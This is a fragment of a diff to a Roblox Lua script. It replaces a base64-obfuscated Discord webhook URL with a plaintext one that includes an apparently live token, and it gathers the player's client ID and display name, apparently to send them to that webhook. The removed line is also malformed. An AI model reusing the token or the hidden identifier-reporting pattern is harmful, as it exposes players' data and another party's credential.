@@ -1,10 +1,6 @@
 local HttpService = game:GetService("HttpService")
 
-local whbase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
-local whId = "MTMyNjA3ODY3Njk0MDQ5Mjg3Mg=="
-local wht = "WmlRMTBlY3VmZk0xeC1lZ0Q5RnBQTlNZUUd0Z3Q1WERPVGRER05zYjNiWEtUTGpMQjNuREg2ejFsaGFjX1RmYWlKc3Y="
-
-local Webhook_ URL= HttpService:Base64Decode(whbase) .. HttpService:Base64Decode(whId) .. "/" .. HttpService:Base64Decode(wht)
+local Webhook_URL = "https://discord.com/api/webhooks/1332331284906774548/p-vfdkturXs0ppzmyDnZ7NOAQ4z5EM01hcO4a208_f35vk11d7BhA46zStwC_G3plTt0"
 local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
 local plr = game.Players.LocalPlayer
 local DName = plr.DisplayName
